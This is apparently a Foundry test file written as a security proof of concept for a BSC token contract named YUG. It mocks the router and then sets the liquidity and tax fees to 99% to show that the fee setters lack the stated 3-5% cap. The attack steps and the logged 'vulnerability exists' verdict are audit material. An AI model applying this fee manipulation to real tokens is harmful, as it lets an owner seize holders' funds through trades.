// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/YUG.sol";

contract YUGTest is Test {
    YUG public token;
    address constant BSC_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MOCK_FACTORY = address(0x100);
    address constant MOCK_WETH = address(0x200);
    address constant MOCK_PAIR = address(0x300);

    function setUp() public {
        // Mock router factory() call
        vm.mockCall(
            BSC_ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(MOCK_FACTORY)
        );
        
        // Mock router WETH() call
        vm.mockCall(
            BSC_ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(MOCK_WETH)
        );
        
        // Mock factory createPair() call
        vm.mockCall(
            MOCK_FACTORY,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(MOCK_PAIR)
        );

        token = new YUG();
    }

    function testFeeCanBeSetToUnlimited() public {
        // Capture initial state
        console.log("--- BEFORE-Trigger State Snapshot ---");
        uint256 liquidityFeeBefore = token._liquidityFee();
        uint256 taxFeeBefore = token._taxFee();
        console.log("Initial Liquidity Fee:", liquidityFeeBefore);
        console.log("Initial Tax Fee:", taxFeeBefore);
        
        console.log("--- Trigger Attack Operation ---");
        // Perform critical attack actions
        token.setLiquidityFeePercent(99); // Way above 3-5% limit
        token.setTaxFeePercent(99);       // Way above 3-5% limit

        // Capture post-attack state
        console.log("--- AFTER-Trigger State Snapshot ---");
        uint256 liquidityFeeAfter = token._liquidityFee();
        uint256 taxFeeAfter = token._taxFee();
        console.log("Post-Attack Liquidity Fee:", liquidityFeeAfter);
        console.log("Post-Attack Tax Fee:", taxFeeAfter);

        // Vulnerability verification
        bool liquidityFeeChanged = liquidityFeeAfter != liquidityFeeBefore;
        bool taxFeeChanged = taxFeeAfter != taxFeeBefore;
        bool feesExceedLimit = liquidityFeeAfter == 99 && taxFeeAfter == 99;
        
        console.log("--- Differential Comparison Verdict ---");
        console.log("Liquidity Fee changed:", liquidityFeeChanged ? "YES" : "NO");
        console.log("Tax Fee changed:", taxFeeChanged ? "YES" : "NO");
        console.log("Fees exceed 5%% limit:", feesExceedLimit ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (feesExceedLimit) {
            console.log("Vulnerability Exists: Fees successfully set beyond 5% limit");
        } else {
            console.log("Vulnerability not Exist: Fees remain within acceptable limits");
        }
    }
}